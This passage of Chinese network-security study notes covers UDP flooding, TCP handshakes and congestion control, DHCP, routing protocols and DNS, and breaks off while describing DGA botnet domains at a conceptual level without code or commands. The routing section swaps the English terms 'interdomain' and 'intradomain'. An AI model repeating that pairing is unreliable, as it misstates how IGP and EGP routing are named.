数据报的时候，它会确定目的端口正在等待中的应用程序。当它发现该端口中并不存在正在等待的应用程序，它就会产生一个目的地址无法连接的ICMP数据包发送给该伪造的源地址。如果发送的足够多的，就会消耗受害系统的资源，造成攻击。和TCP是SYN攻击差不多，也是(D)DoS攻击的一种。</span></p><p><span>自己实现UDP客户端和服务器端可以查看文章：</span><a href='https://blog.csdn.net/lady_killer9/article/details/107000864'><span>python-网络编程之socket</span></a></p><h3 id='参考-4'><span>参考</span></h3><p><span>《TCP/IP详解I》</span></p><p><span>《计算机网络（谢希仁）第七版》</span></p><p><a href='https://datatracker.ietf.org/doc/rfc768/'><span>RFC 768</span></a></p><p>&nbsp;</p><h2 id='23--tcp-协议'><span>2.3  TCP 协议</span></h2><p><a href='https://blog.csdn.net/lady_killer9/article/details/109587532'><span>网络-TCP协议详解自学笔记（例题、代码、实战）</span></a></p><h3 id='231--简介'><span>2.3.1  简介</span></h3><p><span>TCP（Transmission Control Protocol，传输控制协议）是一种面向连接的、可靠的、基于字节流的传输层通信协议，由 RFC 793 定义。</span></p><h4 id='三次握手'><span>三次握手</span></h4><blockquote><p><strong><span>三次握手（Three-Way Handshake）是指建立一个 TCP 连接时，需要客户端和服务端总共发送 3 个包以确认连接的建立。</span></strong></p><p><span>第一次握手客户端将标志位 SYN 置为 1，随机产生一个值 seq=s ，并将该数据包发送给服务端，客户端进入 SYN_SENT 状态，等待服务端确认。</span></p><p><span>第二次握手服务端收到数据包后由标志位 SYN=1 知道客户端请求建立连接，服务端将标志位 SYN 和 ACK都置为 1，ack=s+1，随机产生一个值 seq=k ，并将该数据包发送给客户端以确认连接请求，服务端进入 SYN_RCVD 状态。</span></p><p><span>第三次握手客户端收到确认后，检查 ack 值是否为 s+1，ACK 标志位是否为 1，如果正确则将标志位 ACK置为 1，ack=k+1，并将该数据包发送给服务端，服务端检查 ack 值是否为 k+1，ACK 标志位是否为 1，如果正确则连接建立成功，客户端和服务端进入 ESTABLISHED 状态，完成三次握手。</span></p></blockquote><h4 id='四次挥手'><span>四次挥手</span></h4><blockquote><p><strong><span>四次挥手（Four-Way Wavehand）指断开一个 TCP 连接时，需要客户端和服务端总共发送 4 个包以确认连接的断开。</span></strong></p><p><span>第一次挥手客户端发送一个 FIN ，用来关闭客户端到服务端的数据传送，客户端进入 FIN_WAIT_1 状态。</span></p><p><span>第二次挥手服务端收到 FIN 后，发送一个 ACK 给客户端，确认序号为收到序号 +1，服务端进入 CLOSE_WAIT 状态。</span></p><p><span>第三次挥手服务端发送一个 FIN ，用来关闭服务端到客户端的数据传送，服务端进入 LAST_ACK 状态。</span></p><p><span>第四次挥手客户端收到 FIN 后，客户端进入 TIME_WAIT 状态，接着发送一个 ACK 给服务端，确认序号为收到序号 +1，服务端进入 CLOSED 状态，完成四次挥手。</span></p></blockquote><h3 id='232--拥塞控制'><span>2.3.2  拥塞控制</span></h3><blockquote><p><span>拥塞是指网络中报文数量过多，使得服务端来不及处理，以致引起这部分乃至整个网络性能下降的现象，严重时甚至会导致网络通信业务陷入停顿即出现死锁现象。</span></p><p><span>TCP 采用拥塞控制算法来减少或者避免拥塞现象的发生，TCP 的拥塞算法有过多种实现，包括 Tahoe、Reno、 NewReno、Vegas、Hybla、BIC 、CUBIC、SACK、Westwood、PRR、BBR 等。</span></p></blockquote><h3 id='233--参考链接'><span>2.3.3  参考链接</span></h3><ul><li><p><a href='https://tools.ietf.org/html/rfc793'><span>RFC 793 TRANSMISSION CONTROL PROTOCOL</span></a></p></li><li><p><a href='https://tools.ietf.org/html/rfc2001'><span>RFC 2001 TCP Slow Start, Congestion Avoidance, Fast Retransmit, and Fast Recovery Algorithms</span></a></p></li><li><p><a href='https://tools.ietf.org/html/rfc3390'><span>RFC 3390 Increasing TCP</span>’<span>s Initial Window</span></a></p></li><li><p><a href='https://tools.ietf.org/html/rfc5681'><span>RFC 5681 TCP Congestion Control</span></a></p></li><li><p><a href='https://en.wikipedia.org/wiki/TCP_congestion_control'><span>TCP congestion control wiki</span></a></p><p>&nbsp;</p></li></ul><h2 id='24--dhcp-协议'><span>2.4  DHCP 协议</span></h2><h3 id='241--简介'><span>2.4.1  简介</span></h3><blockquote><p><span>动态主机配置协议 (Dynamic Host Configuration Protocol，DHCP) 是一个用于局域网的网络协议，位于</span></p><p><span>OSI 模型的应用层，使用 UDP 协议工作，主要用于自动分配 IP 地址给用户，方便管理员进行统一管理。</span></p><p><span>DHCP 服务器端使用 67/udp，客户端使用 68/udp。DHCP 运行分为四个基本过程，分别为请求 IP 租约、提供 IP 租约、选择 IP 租约和确认 IP 租约。客户端在获得了一个 IP 地址以后，就可以发送一个 ARP 请求来避免由于 DHCP 服务器地址池重叠而引发的 IP 冲突。</span></p></blockquote><h3 id='242--dchp-报文格式'><span>2.4.2  DCHP 报文格式</span></h3><p><img src="C:/Users/86184/%E6%A1%8C%E9%9D%A2/%E7%BD%91%E5%AE%89%E7%AC%94%E8%AE%B0/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0%E7%BD%91%E7%AB%99/%E5%9B%BE%E7%89%87/f13b8bc2410e0ce8874e342134c1303.jpg" referrerpolicy="no-referrer" alt="f13b8bc2410e0ce8874e342134c1303"></p><p><img src="C:/Users/86184/%E6%A1%8C%E9%9D%A2/%E7%BD%91%E5%AE%89%E7%AC%94%E8%AE%B0/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0%E7%BD%91%E7%AB%99/%E5%9B%BE%E7%89%87/8c5cded67b106b1b13e2cedd6c5f0f8.jpg" referrerpolicy="no-referrer" alt="8c5cded67b106b1b13e2cedd6c5f0f8"></p><h3 id='243--参考链接'><span>2.4.3  参考链接</span></h3><ul><li><a href='https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol'><span>DHCP Wiki</span></a></li></ul><h4 id='rfc-1'><span>RFC</span></h4><ul><li><a href='https://tools.ietf.org/html/rfc2131'><span>RFC 2131 Dynamic Host Configuration Protocol</span></a></li><li><a href='https://tools.ietf.org/html/rfc2132'><span>RFC 2132 DHCP Options and BOOTP Vendor Extensions</span></a></li><li><a href='https://tools.ietf.org/html/rfc3046'><span>RFC 3046 DHCP Relay Agent Information Option</span></a></li><li><a href='https://tools.ietf.org/html/rfc3397'><span>RFC 3397 Dynamic Host Configuration Protocol (DHCP) Domain Search Option</span></a></li><li><a href='https://tools.ietf.org/html/rfc3442'><span>RFC 3442 Classless Static Route Option for Dynamic Host Configuration Protocol (DHCP) version 4</span></a></li><li><a href='https://tools.ietf.org/html/rfc3942'><span>RFC 3942 Reclassifying Dynamic Host Configuration Protocol Version Four (DHCPv4) Options</span></a></li><li><a href='https://tools.ietf.org/html/rfc4242'><span>RFC 4242 Information Refresh Time Option for Dynamic Host Configuration Protocol for IPv6</span></a></li><li><a href='https://tools.ietf.org/html/rfc4361'><span>RFC 4361 Node-specific Client Identifiers for Dynamic Host Configuration Protocol Version Four</span></a><span> </span><a href='https://tools.ietf.org/html/rfc4361'><span>(DHCPv4)</span></a></li><li><a href='https://tools.ietf.org/html/rfc4436'><span>RFC 4436 Detecting Network Attachment in IPv4 (DNAv4)</span></a></li></ul><p>&nbsp;</p><h2 id='25--路由算法'><span>2.5  路由算法</span></h2><h3 id='251--简介'><span>2.5.1  简介</span></h3><blockquote><p><span>路由算法是用于找到一条从源路由器到目的路由器的最佳路径的算法。存在着多种路由算法，每种算法对网络和路由器资源的影响都不同；由于路由算法使用多种度量标准 (metric)，所以不同路由算法的最佳路径选择也有所不同。</span></p></blockquote><h3 id='252--路由选择算法的功能'><span>2.5.2  路由选择算法的功能</span></h3><blockquote><p><span>源/宿对之间的路径选择，以及选定路由之后将报文传送到它们的目的地。</span></p><p><span>路由选择算法的要求：</span></p></blockquote><ul><li><span>正确性：确保分组从源节点传送到目的节点</span></li><li><span>简单性：实现方便，软硬件开销小</span></li><li><span>自适应性：也称健壮性，算法能够适应业务量和网络拓扑的变化</span></li><li><span>稳定性：能长时间无故障运行</span></li><li><span>公平性：每个节点都有机会传送信息</span></li><li><span>最优性：尽量选取好的路由</span></li></ul><h3 id='253--自治系统-as-autonomous-system'><span>2.5.3  自治系统 AS (Autonomous System)</span></h3><blockquote><p><span>经典定义：</span></p></blockquote><ul><li><span>由一个组织管理的一整套路由器和网络。</span></li><li><span>使用一种 AS 内部的路由选择协议和共同的度量以确定分组在该 AS 内的路由。</span></li><li><span>使用一种 AS 之间的路由选择协议用以确定分组在 AS 之间的路由。</span></li></ul><blockquote><p><span>尽管一个 AS 使用了多种内部路由选择协议和度量，但对其他 AS 表现出的是一个单一的和一致的路由选择策略。</span></p></blockquote><h3 id='254--两大类路由选择协议'><span>2.5.4  两大类路由选择协议</span></h3><blockquote><p><span>因特网的中，路由协议可以分为内部网关协议 IGP (Interior Gateway Protocol) 和外部网关协议 EGP (Ex- ternal Gateway Protocol)。</span></p><p><span>IGP 是在一个 AS 内部使用的路由选择协议，如 RIP 和 OSPF 协议，是域内路由选择 (interdomain routing)。当源主机和目的主机处在不同的 AS 中，在数据报到达 AS 的边界时，使用外部网关协议 EGP 将路由选择信息传递到另一个自治系统中，如 BGP-4，是域间路由选择 (intradomain routing)。</span></p></blockquote><h3 id='255--rip'><span>2.5.5  RIP</span></h3><blockquote><p><span>路由信息协议 (Routing Information Protocol, RIP) 是一种基于距离向量的路由选择协议。RIP 协议要求网络中的每一个路由器都要维护从它自己到自治系统内其他每一个目的网络的距离和下一跳路由器地址。</span></p></blockquote><h4 id='256--ospf'><span>2.5.6  OSPF</span></h4><p><span>开放最短路径优先 (Open Shortest Path First，OSPF)，这个算法名为</span>“<span>最短路径优先</span>”<span>是因为使用了 Dijkstra。提出的最短路径算法 SPF，只是一个协议的名字，它并不表示其他的路由选择协议不是</span>“<span>最短路径优先</span>”<span>。</span></p><p><span>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     </span></p><h2 id='26--域名系统'><span>2.6  域名系统</span></h2><h3 id='261--简介'><span>2.6.1  简介</span></h3><blockquote><p><span>DNS 是一个简单的请求-响应协议，是将域名和 IP 地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。DNS 使用 TCP 和 UDP 协议的 53 端口。</span></p></blockquote><h3 id='262--术语'><span>2.6.2  术语</span></h3><h4 id='mdns-1'><span>mDNS</span></h4><blockquote><p><span>Multicast DNS (mDNS)，多播 DNS，使用 5353 端口，组播地址为 224.0.0.251 或 </span><span>[</span><span>FF02::FB</span><span>]</span><span> 。在一个没有常规 DNS 服务器的小型网络内可以使用 mDNS 来实现类似 DNS 的编程接口、包格式和操作语义。 mDNS 协议的报文与 DNS 的报文结构相同，但有些字段对于 mDNS 来说有新的含义。</span></p><p><span>启动 mDNS 的主机会在进入局域网后向所有主机组播消息，包含主机名、IP 等信息，其他拥有相应服务的主机也会响应含有主机名和 IP 的信息。</span></p><p><span>mDNS 的域名是用 .local 和普通域名区分开的。</span></p></blockquote><h4 id='fqdn'><span>FQDN</span></h4><blockquote><p><span>FQDN (Fully-Qualified Domain Name) 是域名的完全形态，主要是包含零长度的根标签，例如 www.example. com. 。</span></p></blockquote><h4 id='tld'><span>TLD</span></h4><blockquote><p><span>Top-Level Domain (TLD) 是属于根域的一个域，例如 com 或 jp 。</span></p><p><span>TLD 一般可以分为 Country Code Top-Level Domains (ccTLDs) 、Generic Top-Level Domains (gTLDs) 以及其它。</span></p></blockquote><h4 id='idn'><span>IDN</span></h4><blockquote><p><span>Internationalized Domain Names for Applications (IDNA) 是为了处理非 ASCII 字符的情况。</span></p></blockquote><h4 id='cname-1'><span>CNAME</span></h4><blockquote><p><span>CNAME 即 Canonical name，又称 alias，将域名指向另一个域名。</span></p></blockquote><h4 id='ttl'><span>TTL</span></h4><blockquote><p><span>Time To Live，无符号整数，记录 DNS 记录过期的时间，最小是 0，最大是 2147483647 (2\^31 - 1)。</span></p></blockquote><h3 id='263--请求响应'><span>2.6.3  请求响应</span></h3><h4 id='dns-记录'><span>DNS 记录</span></h4><ul><li><h5 id='a-记录'><span>A 记录</span></h5><ul><li><span>返回域名对应的 IPv4 地址</span></li></ul></li><li><h5 id='ns-记录-1'><span>NS 记录</span></h5><ul><li><span>域名服务器</span></li><li><span>返回该域名由哪台域名服务器解析</span></li></ul></li><li><h5 id='ptr-记录'><span>PTR 记录</span></h5><ul><li><span>反向记录</span></li><li><span>从 IP 地址到域名的记录</span></li></ul></li><li><h5 id='mx-记录-1'><span>MX 记录</span></h5><ul><li><span>电子邮件交换记录</span></li><li><span>记录邮件域名对应的 IP 地址</span></li></ul></li></ul><h4 id='响应码'><span>响应码</span></h4><ul><li><h5 id='noerror'><span>NOERROR</span></h5><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>1</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">No error condition</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="height: 23px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre></li><li><h5 id='formerr'><span>FORMERR</span></h5><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>1</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Format error - The name server was unable to interpret the query</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="height: 23px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre></li><li><h5 id='servfail'><span>SERVFAIL</span></h5><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33594px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>1</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Server failure - The name server was unable to process this query due to a problem with, the name server</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="height: 45px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre></li><li><h5 id='nxdomain'><span>NXDOMAIN</span></h5><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>1</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">this code signifies that the domain name referenced in the query does not exist</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="height: 23px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre></li><li><h5 id='notimp'><span>NOTIMP</span></h5><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>1</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Not Implemented - The name server does not support the requested kind of query</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="height: 23px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre></li><li><h5 id='refused'><span>REFUSED</span></h5><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33203px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>1</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Refused - The name server refuses to perform the specified operation for policy reasons</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="height: 45px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre></li><li><h5 id='nodata'><span>NODATA</span></h5><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33594px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>1</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">A pseudo RCODE which indicates that the name is valid, for the given class, but [there] are no records of the given type A NODATA response has to be inferred from the answer.</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="height: 68px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre></li></ul><h3 id='264--域名系统工作原理'><span>2.6.4  域名系统工作原理</span></h3><h4 id='解析过程'><span>解析过程</span></h4><p><span>DNS 解析过程是递归查询的，具体过程如下：</span></p><ul><li><span>用户要访问域名 </span><a href='http://www.example.com/'><span>www.example.com</span></a><span> 时，先查看本机 hosts 是否有记录或者本机是否有 DNS 缓存，如果有，直接返回结果，否则向递归服务器查询该域名的 IP 地址</span></li><li><span>递归缓存为空时，首先向根服务器查询 com 顶级域的 IP 地址</span></li><li><span>根服务器告知递归服务器 com 顶级域名服务器的 IP 地址</span></li><li><span>递归向 com 顶级域名服务器查询负责 example.com 的权威服务器的 IP</span></li><li><span>com 顶级域名服务器返回相应的 IP 地址</span></li><li><span>递归向 example.com 的权威服务器查询 </span><a href='http://www.example.com/'><span>www.example.com</span></a><span> 的地址记录</span></li><li><span>权威服务器告知 </span><a href='http://www.example.com/'><span>www.example.com</span></a><span> 的地址记录</span></li><li><span>递归服务器将查询结果返回客户端</span></li></ul><h4 id='域传送'><span>域传送</span></h4><p><span>DNS 服务器可以分为主服务器、备份服务器和缓存服务器。域传送是指备份服务器从主服务器拷贝数据，并使用得到的数据更新自身数据库。域传送是在主备服务器之间同步数据库的机制。</span></p><h3 id='265--服务器类型'><span>2.6.5  服务器类型</span></h3><h4 id='根服务器'><span>根服务器</span></h4><blockquote><p><span>根服务器是 DNS 的核心，负责互联网顶级域名的解析，用于维护域的权威信息，并将 DNS 查询引导到相应的域名服务器。</span></p><p><span>根服务器在域名树中代表最顶级的 . 域，一般省略。</span></p><p><span>13 台 IPv4 根服务器的域名标号为 a 到 m，即 a.root-servers.org 到 m.root-servers.org，所有服务器存储的数据相同，仅包含 ICANN 批准的 TLD 域名权威信息。</span></p></blockquote><h4 id='权威服务器'><span>权威服务器</span></h4><blockquote><p><span>权威服务器上存储域名 Zone 文件，维护域内域名的权威信息，递归服务器可以从权威服务器获得 DNS 查询的资源记录。</span></p><p><span>权威服务器需要在所承载的域名所属的 TLD 管理局注册，同一个权威服务器可以承载不同 TLD 域名，同一个域也可以有多个权威服务器。</span></p></blockquote><h4 id='递归服务器'><span>递归服务器</span></h4><blockquote><p><span>递归服务器负责接收用户的查询请求，进行递归查询并响应用户查询请求。在初始时递归服务器仅有记录了根域名的 Hint 文件。</span></p></blockquote><h3 id='266--dns-利用'><span>2.6.6  DNS 利用</span></h3><h4 id='dga'><span>DGA</span></h4><blockquote><p><span>DGA（Domain Generate Algorithm，域名生成算法）是一种利用随机字符来生成 C&amp;C 域名，从而逃避域名黑名单检测的技术手段，常见于 botnet 中。一般来说，一个 DGA 域名的存活时间约在 1-7 天左右。</span></p><p><span>通信时，客户端和服务端都运行同一套 DGA 算法，生成相同的备选域名列表，当需要发动攻击的时候，选择其中少量进行注册，便可以建立通信，并且可以对注册的域名应用速变 IP 技术，快速变换 IP，从而域名和 IP 都可以进行快速变化。</span></p><p><span>DGA 